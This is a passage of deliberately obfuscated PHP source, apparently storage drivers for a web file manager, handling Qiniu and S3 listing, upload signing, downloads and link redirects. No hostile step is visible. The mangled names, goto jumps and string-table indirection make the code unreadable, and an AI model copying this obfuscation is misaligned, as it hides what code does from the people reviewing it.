check_abort(); list($d•‘‚Ùƒï‘, $F™º×‰‘ó) = $this->bucketManager->listFiles($this->bucket, $DŸã¤¶—Á‰, $dÈ™è§¥ï–, $DĞöÎ­İŞ¸, $cğ„îÂé“Ú); if ($F™º×‰‘ó) { break; } $dÈ™è§¥ï– = array_key_exists($b®ÔğªÀî¯[1236], $d•‘‚Ùƒï‘) ? $dÈ™è§¥ï– = $d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1268]] : $b®ÔğªÀî¯[33]; if ($B‚ñ¤Œ›ãê) { if (!empty($d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1269]])) { $CÇÕåŞöñâ += count($d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1269]]); } if (!empty($d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1270]])) { $c¬ƒ­˜ÍÊË += count($d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1270]]); } if ($dÈ™è§¥ï– === $b®ÔğªÀî¯[33]) { break; } continue; } if ($A°àÆ¼‹ˆ) { if (!empty($d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1269]])) { return !0; } } else { if (!empty($d•‘‚Ùƒï‘[$b®ÔğªÀî¯[1270]])) { return !0; } } if ($dÈ™è§¥ï– === $b®ÔğªÀî¯[33]) { break; } } if ($B‚ñ¤Œ›ãê) { return array($b®ÔğªÀî¯[209] => $CÇÕåŞöñâ, $b®ÔğªÀî¯[210] => $c¬ƒ­˜ÍÊË); } goto a±„Îù×¿—; dÇä©”æº¼: } public function listAll($DÚÓ‘à¬‡´) { $eÔ…¦ò›·Ÿ =& $_SERVER[¢Í]; $a©„Ñ âö· = $this->fileList($DÚÓ‘à¬‡´, $eÔ…¦ò›·Ÿ[33], !0); $Fâ«ó‰·Œ = array(); foreach ($a©„Ñ âö·[$eÔ…¦ò›·Ÿ[83]] as $cÀôØ´—¦) { $Fâ«ó‰·Œ[$cÀôØ´—¦[$eÔ…¦ò›·Ÿ[99]]] = $cÀôØ´—¦[$eÔ…¦ò›·Ÿ[87]]; } foreach ($a©„Ñ âö·[$eÔ…¦ò›·Ÿ[84]] as $cÀôØ´—¦) { if (is_string($cÀôØ´—¦)) { $Fâ«ó‰·Œ[$cÀôØ´—¦] = 0; } } return $this->listAllFiles($DÚÓ‘à¬‡´, array_keys($Fâ«ó‰·Œ), $Fâ«ó‰·Œ); } private function fileList($E¿ß‘š¹È, $b›œ£¿¢Ş = '', $E¾ˆ¸ìˆ‚ª = 0) { goto bï”ñĞÊÔ; B©İ‡„: return array($Eªƒ‡ƒ¸½[84] => $dËÔ’É¤¬¨, $Eªƒ‡ƒ¸½[83] => $dõò‰©ˆ¶Ç); goto fˆœ¬Åßí; eá‹ëƒ¬”: $F‘Ú¦—Ì¯ = $Eªƒ‡ƒ¸½[33]; $C¬Ñó¥Õ‘Õ = 1000; $E²‚‡Üˆ = $this->listItemCache === !1 ? !1 : !0; goto aµá™ÆÌ±à; bï”ñĞÊÔ: $Eªƒ‡ƒ¸½ =& $_SERVER[¢Í]; $E¿ß‘š¹È = trim($E¿ß‘š¹È, $Eªƒ‡ƒ¸½[8]); $A‘èÔ…ê¹„ = empty($E¿ß‘š¹È) ? $Eªƒ‡ƒ¸½[33] : $E¿ß‘š¹È . $Eªƒ‡ƒ¸½[8]; goto eá‹ëƒ¬”; aµá™ÆÌ±à: $dËÔ’É¤¬¨ = $dõò‰©ˆ¶Ç = array(); while (!0) { check_abort(); list($D¶¼ˆÌğ¾í, $e²Ñ£¬¹º’) = $this->bucketManager->listFiles($this->bucket, $A‘èÔ…ê¹„, $F‘Ú¦—Ì¯, $C¬Ñó¥Õ‘Õ, $b›œ£¿¢Ş); if ($e²Ñ£¬¹º’) { break; } $F‘Ú¦—Ì¯ = array_key_exists($Eªƒ‡ƒ¸½[1236], $D¶¼ˆÌğ¾í) ? $F‘Ú¦—Ì¯ = $D¶¼ˆÌğ¾í[$Eªƒ‡ƒ¸½[1268]] : $Eªƒ‡ƒ¸½[33]; $bìğø£‹—Ç = isset($D¶¼ˆÌğ¾í[$Eªƒ‡ƒ¸½[1269]]) ? $D¶¼ˆÌğ¾í[$Eªƒ‡ƒ¸½[1269]] : array(); $eñ´õ‡…Ê = isset($D¶¼ˆÌğ¾í[$Eªƒ‡ƒ¸½[1270]]) ? $D¶¼ˆÌğ¾í[$Eªƒ‡ƒ¸½[1270]] : array(); foreach ($bìğø£‹—Ç as $CŸé¼¹ØÍ¸) { goto c¾¾Öİ–¼ ; BêƒÅéÂÂ¡: $CŸé¼¹ØÍ¸[$Eªƒ‡ƒ¸½[87]] = $bã…âÓÊÛ; $d¸ Ñ†¦µ = $bã…âÓÊÛ == 0 && substr($bÙ‘Ì–‚²—, strlen($bÙ‘Ì–‚²—) - 1, 1) == $Eªƒ‡ƒ¸½[8] ? !0 : !1; if ($E²‚‡Üˆ) { $this->cacheMethod($Eªƒ‡ƒ¸½[205], $bÙ‘Ì–‚²—, $d¸ Ñ†¦µ); $this->cacheMethod($Eªƒ‡ƒ¸½[206], $bÙ‘Ì–‚²—, $CŸé¼¹ØÍ¸); } goto EØ¦‘Â; c¾¾Öİ–¼ : if ($CŸé¼¹ØÍ¸[$Eªƒ‡ƒ¸½[99]] == $A‘èÔ…ê¹„) { continue; } $bÙ‘Ì–‚²— = $CŸé¼¹ØÍ¸[$Eªƒ‡ƒ¸½[99]]; $bã…âÓÊÛ = $CŸé¼¹ØÍ¸[$Eªƒ‡ƒ¸½[1266]]; goto BêƒÅéÂÂ¡; EØ¦‘Â: if ($d¸ Ñ†¦µ) { $dËÔ’É¤¬¨[] = $bÙ‘Ì–‚²—; continue; } $dõò‰©ˆ¶Ç[] = $E¾ˆ¸ìˆ‚ª ? $CŸé¼¹ØÍ¸ : $bÙ‘Ì–‚²—; goto CŠô†¦èÀõ; CŠô†¦èÀõ: } foreach ($eñ´õ‡…Ê as $bÙ‘Ì–‚²—) { if ($bÙ‘Ì–‚²— == $A‘èÔ…ê¹„) { continue; } $dËÔ’É¤¬¨[] = $bÙ‘Ì–‚²—; if ($E²‚‡Üˆ) { $this->cacheMethod($Eªƒ‡ƒ¸½[205], $bÙ‘Ì–‚²—, !0); } } if ($F‘Ú¦—Ì¯ === $Eªƒ‡ƒ¸½[33]) { break; } } if ($E²‚‡Üˆ) { $this->cacheMethod($Eªƒ‡ƒ¸½[205], $E¿ß‘š¹È, !0); } goto B©İ‡„; fˆœ¬Åßí: } public function canRead($F¼ë»ë×ÅÎ) { return $this->exist($F¼ë»ë×ÅÎ) ? !0 : !1; } public function canWrite($aØº…ÃÁËŸ) { return $this->exist($aØº…ÃÁËŸ) ? !0 : !1; } public function getContent($e–¼ï¯‡Š¤) { return $this->fileSubstr($e–¼ï¯‡Š¤, 0, -1); } public function setContent($fÆ¿—ñÎÙ, $Dé¾¬–Ÿö‚ = '') { $aÕŒø›Óí = $this->tempFile($this->pathThis($fÆ¿—ñÎÙ)); file_put_contents($aÕŒø›Óí, $Dé¾¬–Ÿö‚); if ($this->upload($fÆ¿—ñÎÙ, $aÕŒø›Óí)) { $this->tempFileRemve($aÕŒø›Óí); return !0; } return !1; } public function refreshUrls($A‡‡ŸÎÁ«) { goto a›Šœ’Š¯¾; a›Šœ’Š¯¾: $aîÔĞéœº =& $_SERVER[¢Í]; $C‰ºäˆªÅ° = array(); if (is_array($A‡‡ŸÎÁ«)) { foreach ($A‡‡ŸÎÁ« as $fİµìĞŠ—Í) { $C‰ºäˆªÅ°[] = $this->link($fİµìĞŠ—Í); } } else { $C‰ºäˆªÅ°[] = $this->link($A‡‡ŸÎÁ«); } goto FÏ¥äÒË; FÏ¥äÒË: $EíÄ«ÜŞÆÜ = new Qiniu\Cdn\CdnManager($this->auth); list($A·æ¦¶ã‚¡, $EÀÚ…¼¾«Ã) = $EíÄ«ÜŞÆÜ->refreshUrls($C‰ºäˆªÅ°); if ($EÀÚ…¼¾«Ã) { return !1; } goto bùÏ¤¶¡£à; bùÏ¤¶¡£à: return $A·æ¦¶ã‚¡[$aîÔĞéœº[1045]] == $aîÔĞéœº[710] ? !0 : !1; goto Eà¨ÀˆÔ¸; Eà¨ÀˆÔ¸: } public function fileSubstr($C¬ŸøÈÒÆ, $dƒƒšÏ³·Ì, $d±¥Ãß¿”„) { $Eàíˆé¨˜æ =& $_SERVER[¢Í]; if (!($CëÃœÚÔÏ = $this->link($C¬ŸøÈÒÆ))) { return !1; } $Fœî´ö×òƒ = !1; if ($d±¥Ãß¿”„ > 0) { $cÇóì†Ó = $dƒƒšÏ³·Ì + $d±¥Ãß¿”„ - 1; $Fœî´ö×òƒ = array($Eàíˆé¨˜æ[1271] . $dƒƒšÏ³·Ì . $Eàíˆé¨˜æ[437] . $cÇóì†Ó); } $aáé‘Œ¦Øæ = url_request($CëÃœÚÔÏ, $Eàíˆé¨˜æ[234], !1, $Fœî´ö×òƒ); return $aáé‘Œ¦Øæ[$Eàíˆé¨˜æ[703]] ? $aáé‘Œ¦Øæ[$Eàíˆé¨˜æ[1055]] : !1; } public function upload($DÙÜ•ÈÖ·, $EŸÍ¢¢§·‚, $Bºİ­ŸÊšø = false, $DÉ¥ñë—ç² = REPEAT_REPLACE) { $dçÀâ©¿ô = new Qiniu\Storage\UploadManager(); $A®èŸá†©Ú = $this->auth->uploadToken($this->bucket, $DÙÜ•ÈÖ·); $FÃ³éŸ†ÉŒ = get_file_mime(get_path_ext($EŸÍ¢¢§·‚)); list($aî“²ĞÕ¢Š, $bõ­—›¢Û›) = $dçÀâ©¿ô->putFile($A®èŸá†©Ú, $DÙÜ•ÈÖ·, $EŸÍ¢¢§·‚, null, $FÃ³éŸ†ÉŒ); return $bõ­—›¢Û› ? !1 : $this->getPathOuter($DÙÜ•ÈÖ·); } public function uploadFormData($E‰ç·£ÈÀ‚, $DğçÛÍĞÑÆ = 3600) { return $this->uploadToken($E‰ç·£ÈÀ‚, $DğçÛÍĞÑÆ); } public function multiUploadFormData($cĞˆÉ©ø‡¸, $Cìñ£ù‡ß¦ = 3600) { return $this->uploadToken($cĞˆÉ©ø‡¸, $Cìñ£ù‡ß¦); } private function uploadToken($DœÎ²¨†¤ó, $cÔÂÆ‘ÁÓæ = 3600) { goto f¶¢ï¤ñäé; e½¦»»¸: $aè³±»êÅ„ = $DœÎ²¨†¤ó; $a˜‡…îª‡† = $this->auth->uploadToken($this->bucket, $aè³±»êÅ„, $bÌ«ˆ×Şê¸, $cáŞˆĞ¡, !0); $a‡­‡ò†ª = empty($this->region) || $this->region == $Cóİ½¢ŠŞ[1274] ? $Cóİ½¢ŠŞ[33] : $Cóİ½¢ŠŞ[437] . $this->region; goto C´»÷†ñÁ½; C´»÷†ñÁ½: $dŒƒ‚µÓŸö = http_type() . "\x3a\x2f\x2f\x75\x70\x6c\157\x61\x64{$a‡­‡ò†ª}\x2e\161\151\156\151\165\x70\x2e\x63\157\x6d\57"; return array($Cóİ½¢ŠŞ[1275] => $a˜‡…îª‡†, $Cóİ½¢ŠŞ[1276] => $dŒƒ‚µÓŸö); goto a˜‡ÃŸí³¹; f¶¢ï¤ñäé: $Cóİ½¢ŠŞ =& $_SERVER[¢Í]; $bÌ«ˆ×Şê¸ = $cÔÂÆ‘ÁÓæ; $cáŞˆĞ¡ = array($Cóİ½¢ŠŞ[1272] => $Cóİ½¢ŠŞ[1273]); goto e½¦»»¸; a˜‡ÃŸí³¹: } public function download($CöšñŸ¼²Ã, $c‘ÑâÄˆï ) { goto cÓ×ŞÈ®ğŸ; eñÃˆ£ÛÒƒ: $BÈ×ô­ç¹ = 1024 * 200; $f°É©à“ì = fopen($f¬ ÅØ»¨, $_SERVER[¢Í][1277]); while (!0) { $aÂÈ»÷®Öä = $this->fileSubstr($CöšñŸ¼²Ã, $a¤÷ãìÃˆï, $BÈ×ô­ç¹); if ($aÂÈ»÷®Öä === !1) { return !1; } fwrite($f°É©à“ì, $aÂÈ»÷®Öä); $a¤÷ãìÃˆï += $BÈ×ô­ç¹; if (strlen($aÂÈ»÷®Öä) < $BÈ×ô­ç¹) { break; } } goto dŞ°…Ä£Ä; cÓ×ŞÈ®ğŸ: $f¬ ÅØ»¨ = IO::getPathInner(IO::mkfile($c‘ÑâÄˆï )); if (!($eÛ®§„ÙÑ‘ = $this->link($CöšñŸ¼²Ã))) { return !1; } $a¤÷ãìÃˆï = 0; goto eñÃˆ£ÛÒƒ; dŞ°…Ä£Ä: fclose($f°É©à“ì); return $c‘ÑâÄˆï ; goto c§¢Á‰ ç; c§¢Á‰ ç: } public function link($dì¬Š§¤Œ, $EË³ÒÍ•Ğò = '') { if (!$this->isFile($dì¬Š§¤Œ)) { return !1; } $A‘©×´œÆ = $this->getHost() . $_SERVER[¢Í][8] . $this->pathEncode($dì¬Š§¤Œ) . $EË³ÒÍ•Ğò; return $this->auth->privateDownloadUrl($A‘©×´œÆ, 3600 * 12); } public function fileOut($fŸöİ¯Â£, $Eœ”á–Á¶´ = false, $Bò½Ğ´Ğá = false, $A¾î¬¢Š¾‘ = '') { $F¬àöŠÔÏ =& $_SERVER[¢Í]; if ($this->isFileOutServer()) { return $this->fileOutServer($fŸöİ¯Â£, $Eœ”á–Á¶´, $Bò½Ğ´Ğá, $A¾î¬¢Š¾‘); } if (!$Bò½Ğ´Ğá) { $Bò½Ğ´Ğá = $this->pathThis($fŸöİ¯Â£); } $aÙ‡ŠÄ–Šå = $Eœ”á–Á¶´ ? $F¬àöŠÔÏ[1278] . rawurlencode($Bò½Ğ´Ğá) : $F¬àöŠÔÏ[33]; $A¨‰õáŠõœ = $this->link($fŸöİ¯Â£, $aÙ‡ŠÄ–Šå); $this->fileOutLink($A¨‰õáŠõœ); } public function fileOutServer($bÒö¸Üê, $CÑØ»³ = false, $eòÄ×ŸÃï± = false, $f²øåíâÛŒ = '') { parent::fileOut($bÒö¸Üê, $CÑØ»³, $eòÄ×ŸÃï±, $f²øåíâÛŒ); } public function fileOutImage($B°ñ²°Ğè”, $aÄîÖù©Ä¸ = 250) { $bğ„ïÙÀß‹ = $this->link($B°ñ²°Ğè”, $_SERVER[¢Í][1279] . $aÄîÖù©Ä¸); $this->fileOutLink($bğ„ïÙÀß‹); } public function fileOutImageServer($d‘­²Ç¾, $b´Õ­ìŸİ¤ = 250) { parent::fileOutImage($d‘­²Ç¾, $b´Õ­ìŸİ¤); } public function hashMd5($BåÔ×ŠƒÔé) { $e¿²¢µ“Ê† =& $_SERVER[¢Í]; $FÓßÉÍÖÇ = $this->objectMeta($BåÔ×ŠƒÔé); return isset($FÓßÉÍÖÇ[$e¿²¢µ“Ê†[214]]) ? $FÓßÉÍÖÇ[$e¿²¢µ“Ê†[214]] : !1; $dÖÖÆ¹õ„ = $this->link($BåÔ×ŠƒÔé, $e¿²¢µ“Ê†[1280]); } public function size($EçŒ…·òã) { $c‰¬Ëİ´˜â = $this->objectMeta($EçŒ…·òã); return $c‰¬Ëİ´˜â ? $c‰¬Ëİ´˜â[$_SERVER[¢Í][87]] : 0; } public function info($DóÓ¥µÅ˜‹) { if ($this->isFolder($DóÓ¥µÅ˜‹)) { return $this->folderInfo($DóÓ¥µÅ˜‹); } else { if ($this->isFile($DóÓ¥µÅ˜‹)) { return $this->fileInfo($DóÓ¥µÅ˜‹); } } return !1; } public function exist($béŞÊ÷Š) { return $this->isFile($béŞÊ÷Š) || $this->isFolder($béŞÊ÷Š); } public function isFile($dãÈ†Ğ¨ê‚) { return !$this->isFolder($dãÈ†Ğ¨ê‚) && $this->objectMeta($dãÈ†Ğ¨ê‚); } public function isFolder($bŸ¡Ì˜Ï‚Ë) { return $this->cacheMethod($_SERVER[¢Í][205], $bŸ¡Ì˜Ï‚Ë); } protected function objectMeta($E×¾ìôØŞÀ) { return $this->cacheMethod($_SERVER[¢Í][206], $E×¾ìôØŞÀ); } protected function _objectMeta($c„¸÷‰á»í) { $bÜ•”´Ù¯ =& $_SERVER[¢Í]; list($dËÕîÏàªº, $B–®³Ì¸†) = $this->bucketManager->stat($this->bucket, $c„¸÷‰á»í); if ($dËÕîÏàªº) { $dËÕîÏàªº[$bÜ•”´Ù¯[87]] = intval($dËÕîÏàªº[$bÜ•”´Ù¯[1266]]); } return $dËÕîÏàªº; } protected function _isFolder($bÀâÄÈŸ­) { $fã³¾Ì©Å… =& $_SERVER[¢Í]; if ($bÀâÄÈŸ­ == $fã³¾Ì©Å…[33] || $bÀâÄÈŸ­ == $fã³¾Ì©Å…[8]) { return !0; } list($d¨˜•ù÷Œ, $e™¼šÏÁ´×) = $this->bucketManager->listFiles($this->bucket, trim($bÀâÄÈŸ­, $fã³¾Ì©Å…[8]) . $fã³¾Ì©Å…[8], $fã³¾Ì©Å…[33], 1, $fã³¾Ì©Å…[8]); return !empty($d¨˜•ù÷Œ[$fã³¾Ì©Å…[1269]]) || !empty($d¨˜•ù÷Œ[$fã³¾Ì©Å…[1270]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($b©àĞìˆÍš) { parent::__construct($b©àĞìˆÍš); } public function uploadFormData($cÚš«Œå…, $bİôÆç¢Öª = 3600) { goto E–ğ¬è©¡ô; dìåè¹õ¹·: $f‘°åÍ‹†¯ = base64_encode(json_encode($eÜ®‹˜ä)); $B·ƒ²®Ç¶ = hash_hmac($eÂÚƒÙ…¹İ[1196], $Fœğğ£îµƒ, $eÂÚƒÙ…¹İ[1197] . $this->secret, !0); $a•”íâ•˜ğ = hash_hmac($eÂÚƒÙ…¹İ[1196], $this->region, $B·ƒ²®Ç¶, !0); goto B¦Üã¿¡ˆë; E–ğ¬è©¡ô: $eÂÚƒÙ…¹İ =& $_SERVER[¢Í]; $bî‡Œğ§ª£ = $eÂÚƒÙ…¹İ[199]; $c‹Š÷¿ = $eÂÚƒÙ…¹İ[1186]; goto f”´…ŒííŒ; EŞÎ©ÅŸ¨²: $FÛ¹œ¿Œ½ê = array($this->accessKey, $Fœğğ£îµƒ, $this->region, $D‡…äœ¾Ù, $d‹Ü¸Â‹§); $D¯ÃÙ­¹â = implode($eÂÚƒÙ…¹İ[8], $FÛ¹œ¿Œ½ê); $eÜ®‹˜ä = array($eÂÚƒÙ…¹İ[1154] => gmdate($eÂÚƒÙ…¹İ[1153], strtotime($eÂÚƒÙ…¹İ[1189])), $eÂÚƒÙ…¹İ[1155] => array(array($eÂÚƒÙ…¹İ[1157] => $this->bucket), array($eÂÚƒÙ…¹İ[1156] => $bî‡Œğ§ª£), array($eÂÚƒÙ…¹İ[1158], $eÂÚƒÙ…¹İ[1159], $eÂÚƒÙ…¹İ[33]), array($eÂÚƒÙ…¹İ[1158], $eÂÚƒÙ…¹İ[1190], $eÂÚƒÙ…¹İ[33]), array($eÂÚƒÙ…¹İ[1158], $eÂÚƒÙ…¹İ[1191], $eÂÚƒÙ…¹İ[33]), array($eÂÚƒÙ…¹İ[1160] => $cµØÅê¸¹ç), array($eÂÚƒÙ…¹İ[1192] => $D¯ÃÙ­¹â), array($eÂÚƒÙ…¹İ[1193] => $c‹Š÷¿), array($eÂÚƒÙ…¹İ[1194] => $C‰èâÙƒëÓ), array($eÂÚƒÙ…¹İ[1195] => $CîĞõë î×))); goto dìåè¹õ¹·; eºİ¡‘ÊŞ: $d‹Ü¸Â‹§ = $eÂÚƒÙ…¹İ[1188]; $CîĞõë î× = $bİôÆç¢Öª . $eÂÚƒÙ…¹İ[33]; $cµØÅê¸¹ç = $eÂÚƒÙ…¹İ[1152]; goto EŞÎ©ÅŸ¨²; B¤Œö„¨: $cÕë–Ëí¦ = array($eÂÚƒÙ…¹İ[217] => $eÂÚƒÙ…¹İ[33], $eÂÚƒÙ…¹İ[1198] => $eÂÚƒÙ…¹İ[33], $eÂÚƒÙ…¹İ[1156] => $bî‡Œğ§ª£, $eÂÚƒÙ…¹İ[1160] => $cµØÅê¸¹ç, $eÂÚƒÙ…¹İ[1164] => $f‘°åÍ‹†¯, $eÂÚƒÙ…¹İ[1199] => $D¯ÃÙ­¹â, $eÂÚƒÙ…¹İ[1200] => $c‹Š÷¿, $eÂÚƒÙ…¹İ[1201] => $C‰èâÙƒëÓ, $eÂÚƒÙ…¹İ[1202] => $CîĞõë î×, $eÂÚƒÙ…¹İ[1203] => $bĞ÷Ó‹ğí÷, $eÂÚƒÙ…¹İ[183] => $this->getHost()); return $cÕë–Ëí¦; goto EÙŠî¤§Å‘; f”´…ŒííŒ: $D‡…äœ¾Ù = $eÂÚƒÙ…¹İ[69]; $C‰èâÙƒëÓ = gmdate($eÂÚƒÙ…¹İ[1187]); $Fœğğ£îµƒ = gmdate($eÂÚƒÙ…¹İ[704]); goto eºİ¡‘ÊŞ; B¦Üã¿¡ˆë: $fÄìîË¹‚© = hash_hmac($eÂÚƒÙ…¹İ[1196], $D‡…äœ¾Ù, $a•”íâ•˜ğ, !0); $f‡Û…Âë® = hash_hmac($eÂÚƒÙ…¹İ[1196], $d‹Ü¸Â‹§, $fÄìîË¹‚©, !0); $bĞ÷Ó‹ğí÷ = hash_hmac($eÂÚƒÙ…¹İ[1196], $f‘°åÍ‹†¯, $f‡Û…Âë®); goto B¤Œö„¨; EÙŠî¤§Å‘: } public function multiUploadFormData($aàĞÙëøå , $cƒ²áÂù‰œ = 3600) { $e¯î£²ÎË =& $_SERVER[¢Í]; $EùéÊ®ó…§ = gmdate($e¯î£²ÎË[1281]); $cì—‡èâ¸ö = array(); $a–Öšà¤ˆâ = $this->client->getUploadId($this->bucket, $aàĞÙëøå , $cì—‡èâ¸ö); if (!$a–Öšà¤ˆâ) { return !1; } return array($e¯î£²ÎË[227] => $a–Öšà¤ˆâ, $e¯î£²ÎË[183] => $this->getHost() . $e¯î£²ÎË[8] . $this->pathEncode($aàĞÙëøå ), $e¯î£²ÎË[228] => $EùéÊ®ó…§, $e¯î£²ÎË[99] => $aàĞÙëøå ); } public function multiUploadAuthData($D³ƒÖ“ö‡¿, $d¹ãÈÀòóÚ = array()) { goto Dğ‚¨Ã“Ë°; A˜™Çß’…¦: unset($d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[99]]); if (isset($d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[229]])) { return $this->listUploadParts($Eœß‡·Ë£×, $d¹ãÈÀòóÚ); } $BîÍÕ¿”·´ = array(); goto f¾©½‡¢éæ; Dğ‚¨Ã“Ë°: $a‹ÑÅ·¹®è =& $_SERVER[¢Í]; $e–ôªÓÇ–² = isset($d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[175]]) ? $d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[175]] : $a‹ÑÅ·¹®è[33]; $Eœß‡·Ë£× = $d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[99]]; goto A˜™Çß’…¦; D°Şƒ£¢: $cÓ²ô÷Ø = $a‹ÑÅ·¹®è[232]; $aƒô¬Ş¡ŞÀ = $a‹ÑÅ·¹®è[8] . $this->pathEncode($Eœß‡·Ë£×) . $e–ôªÓÇ–²; $cÆ—š¿Œêï = $this->client->__getSignatureV4($BîÍÕ¿”·´, $F‰„¶£šÒÎ, $cÓ²ô÷Ø, $aƒô¬Ş¡ŞÀ); goto B»°Ğ†ÛÆİ; B»°Ğ†ÛÆİ: if (strpos($e–ôªÓÇ–², $a‹ÑÅ·¹®è[231]) === 0) { if (isset($BîÍÕ¿”·´[$a‹ÑÅ·¹®è[1283]])) { $Eö›ô”Á¥­ = $BîÍÕ¿”·´[$a‹ÑÅ·¹®è[1283]]; } else { if (isset($cÆ—š¿Œêï[$a‹ÑÅ·¹®è[1283]])) { $Eö›ô”Á¥­ = $cÆ—š¿Œêï[$a‹ÑÅ·¹®è[1283]]; } else { $Eö›ô”Á¥­ = hash($a‹ÑÅ·¹®è[1196], $a‹ÑÅ·¹®è[33]); } } return array($a‹ÑÅ·¹®è[237] => $cÆ—š¿Œêï[$a‹ÑÅ·¹®è[237]], $a‹ÑÅ·¹®è[1283] => $Eö›ô”Á¥­, $a‹ÑÅ·¹®è[228] => $cÆ—š¿Œêï[$a‹ÑÅ·¹®è[1286]]); } return $cÆ—š¿Œêï[$a‹ÑÅ·¹®è[237]]; goto E¡š‹ôÌËä; f¾©½‡¢éæ: if (isset($d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[1282]])) { $BîÍÕ¿”·´[$a‹ÑÅ·¹®è[1283]] = $d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[1282]]; } $aõÅ•ÆÇãù = explode($a‹ÑÅ·¹®è[185], $this->getHost()); $F‰„¶£šÒÎ = array($a‹ÑÅ·¹®è[1284] => $aõÅ•ÆÇãù[1], $a‹ÑÅ·¹®è[1285] => $a‹ÑÅ·¹®è[33], $a‹ÑÅ·¹®è[217] => $a‹ÑÅ·¹®è[126], $a‹ÑÅ·¹®è[1198] => $d¹ãÈÀòóÚ[$a‹ÑÅ·¹®è[87]]); goto D°Şƒ£¢; E¡š‹ôÌËä: } public function listUploadParts($D¾÷š±«ƒĞ, $D™³´¾¿Š• = array()) { goto CÆÃ‚õ·ˆ­; CÆÃ‚õ·ˆ­: $cø±ÍÖ¦½ =& $_SERVER[¢Í]; $d…¾Ñ¡Æ“… = str_replace($cø±ÍÖ¦½[238], $cø±ÍÖ¦½[33], $D™³´¾¿Š•[$cø±ÍÖ¦½[175]]); $aÀ•„ôéö = $this->client->listParts($this->bucket, $D¾÷š±«ƒĞ, $d…¾Ñ¡Æ“…); goto B¶¸®ËÄ; B¶¸®ËÄ: if (!$aÀ•„ôéö) { return !1; } $f…¸äÏÓ¤ = $cø±ÍÖ¦½[1287]; foreach ($aÀ•„ôéö as $AÇ«¥ Ü¼) { $f…¸äÏÓ¤ .= $cø±ÍÖ¦½[1288] . "\74\120\x61\x72\164\116\165\155\x62\145\x72\76{$AÇ«¥ Ü¼[$cø±ÍÖ¦½[1243]]}\74\57\x50\x61\162\x74\x4e\x75\155\142\145\162\76\12" . "\x3c\x45\124\141\147\76{$AÇ«¥ Ü¼[$cø±ÍÖ¦½[1244]]}\x3c\x2f\105\124\141\147\x3e\xa" . $cø±ÍÖ¦½[1289]; } goto fíÑ¾¨Şù ; dÙ³“ËÌŒ‚: $B÷ÜÓÇ¶œ = array($cø±ÍÖ¦½[1284] => $dÃæÕìôµ‘[1], $cø±ÍÖ¦½[217] => $cø±ÍÖ¦½[126], $cø±ÍÖ¦½[1198] => strlen($f…¸äÏÓ¤)); $f´îŸ Ù¦˜ = $cø±ÍÖ¦½[230]; $C¾á…†°ƒÉ = $cø±ÍÖ¦½[8] . $this->pathEncode($D¾÷š±«ƒĞ) . $D™³´¾¿Š•[$cø±ÍÖ¦½[175]]; goto eÄ¡öÌ—À; fíÑ¾¨Şù : $f…¸äÏÓ¤ .= $cø±ÍÖ¦½[1290]; $C°¶İ—¶õô = array(); $dÃæÕìôµ‘ = explode($cø±ÍÖ¦½[185], $this->getHost()); goto dÙ³“ËÌŒ‚; eÄ¡öÌ—À: $d‰²æÀÖéİ = $this->client->__getSignatureV4($C°¶İ—¶õô, $B÷ÜÓÇ¶œ, $f´îŸ Ù¦˜, $C¾á…†°ƒÉ, $f…¸äÏÓ¤); return array($cø±ÍÖ¦½[237] => $d‰²æÀÖéİ[$cø±ÍÖ¦½[237]], $cø±ÍÖ¦½[228] => $d‰²æÀÖéİ[$cø±ÍÖ¦½[1286]], $cø±ÍÖ¦½[239] => $aÀ•„ôéö, $cø±ÍÖ¦½[1283] => $d‰²æÀÖéİ[$cø±ÍÖ¦½[1283]]); goto B§Ù•ŒÓ’; B§Ù•ŒÓ’: } public function link($fãå¤¹ôÉÀ, $fÜæ–ÇÇ² = array()) { return parent::link($fãå¤¹ôÉÀ, $fÜæ–ÇÇ²); } public function fileOut($A¾©§¾òÑ, $AÔİäËİ¡ğ = false, $A­¸ØÑ§•¨ = false, $d…‹¯õùĞ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¢Í][1291])) { return parent::fileOutServer($A¾©§¾òÑ, $AÔİäËİ¡ğ, $A­¸ØÑ§•¨, $d…‹¯õùĞ); } parent::fileOut($A¾©§¾òÑ, $AÔİäËİ¡ğ, $A­¸ØÑ§•¨, $d…‹¯õùĞ); } public function fileOutImage($BƒŠªÕ½ø, $CºĞĞİÄÕ = 250) { if (strstr($this->endpoint, $_SERVER[¢Í][1291])) { return parent::fileOutImageServer($BƒŠªÕ½ø, $CºĞĞİÄÕ); } parent::fileOutImage($BƒŠªÕ½ø, $CºĞĞİÄÕ); } public function fileOutLink($D½¥ŸÒ¯‰İ) { $câñ­²àò® =& $_SERVER[¢Í]; if (substr($D½¥ŸÒ¯‰İ, 0, 7) == $câñ­²àò®[1167]) { $D½¥ŸÒ¯‰İ = $câñ­²àò®[1168] . substr($D½¥ŸÒ¯‰İ, 7); } header($câñ­²àò®[166] . $D½¥ŸÒ¯‰İ); die; } public function getHost() { $DÕ£‚“¶œÛ =& $_SERVER[¢Í]; $aµÈ˜œ—ÃÆ = str_rtrim(parent::getHost(), $DÕ£‚“¶œÛ[8] . $this->bucket); $aµÈ˜œ—ÃÆ = explode($DÕ£‚“¶œÛ[185], $aµÈ˜œ—ÃÆ); return $aµÈ˜œ—ÃÆ[0] . $DÕ£‚“¶œÛ[185] . $this->bucket . $DÕ£‚“¶œÛ[101] . $aµÈ˜œ—ÃÆ[1]; } } goto BÃ¾Œ¥ë; B°Šˆæô™İ: class BackupDbFile { public function __construct() { } public function index() { goto f†ô„ª¢§§; f†ô„ª¢§§: $f›™Ğè…ƒ =& $_SERVER[¢Í]; $Bí§²ù±ç‹ = Backup::get(); $c§Öõ²­å‹ = $Bí§²ù±ç‹[$f›™Ğè…ƒ[28]]; goto A±é¨È‘ ; D»ŠÇäÄ½À: $E‘à‹”õ† = 